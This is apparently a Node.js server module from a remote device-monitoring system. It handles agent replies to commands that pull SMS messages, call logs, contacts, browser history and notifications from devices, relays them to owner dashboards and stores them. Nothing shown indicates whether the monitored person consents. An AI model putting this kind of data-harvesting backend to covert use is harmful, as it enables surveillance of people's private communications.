const { persistHistoryPayload } = require('../services/historySyncService');
const writeQueue = require('../services/writeQueue');
const { sendToOwnerDashboards } = require('./fanout');

const HISTORY_COMMANDS = new Set([
    'FETCH_BROWSER_HISTORY',
    'FETCH_APP_HISTORY',
    'FETCH_SYSTEM_NOTIFICATIONS',
    'FETCH_CALL_LOGS',
    'FETCH_SMS_MESSAGES',
    'FETCH_CONTACTS',
    'STOP_HISTORY_COLLECTION'
]);

function isHistoryCommand(action) {
    return HISTORY_COMMANDS.has(String(action || ''));
}

function isHistoryAgentResponse(packet) {
    if (!packet || typeof packet !== 'object') return false;
    const command = String(packet.command || '');
    if (!HISTORY_COMMANDS.has(command)) return false;
    return packet.success === true || packet.success === 'true';
}

function extractDeviceIdFromAgentSocket(ws) {
    const key = String(ws?.connectionKey || '');
    if (key.startsWith('AGENT_')) return key.slice('AGENT_'.length);
    if (key.startsWith('DEVICE_')) return key.slice('DEVICE_'.length);
    return '';
}

function handleHistoryAgentResponse(ws, packet, activeConnections) {
    const deviceId = extractDeviceIdFromAgentSocket(ws);
    const userId = ws?.authContext?.userId || ws?.authContext?.user?.id || null;
    if (!deviceId || !userId) return;

    const entries = Array.isArray(packet.data)
        ? packet.data
        : Array.isArray(packet.entries)
            ? packet.entries
            : [];

    // Dashboard first — never wait for Mongo.
    sendToOwnerDashboards(activeConnections, userId, {
        type: 'history_telemetry',
        deviceId,
        command: packet.command,
        count: entries.length,
        data: entries,
        entries,
        incremental: Boolean(packet.incremental),
        syncedAt: new Date().toISOString(),
    });

    try {
        const liveLogBus = require('../services/liveLogBus');
        liveLogBus.push({
            channel: 'agent',
            level: 'info',
            message: `[AGENT:RECV] History payload from ${deviceId}: command=${packet.command} (${entries.length} items)`,
            deviceId,
            userId,
            meta: { command: packet.command, count: entries.length }
        });
        liveLogBus.push({
            channel: 'node',
            level: 'info',
            message: `[NODE:REACT] Relayed history telemetry (${packet.command}, +${entries.length}) for device ${deviceId} to dashboard`,
            deviceId,
            userId,
            meta: { command: packet.command, count: entries.length }
        });
    } catch (_) {}

    writeQueue.enqueue(async () => {
        await persistHistoryPayload(deviceId, { ...packet, userId, data: entries });
    });
}

module.exports = {
    HISTORY_COMMANDS,
    isHistoryCommand,
    isHistoryAgentResponse,
    handleHistoryAgentResponse,
    extractDeviceIdFromAgentSocket
};
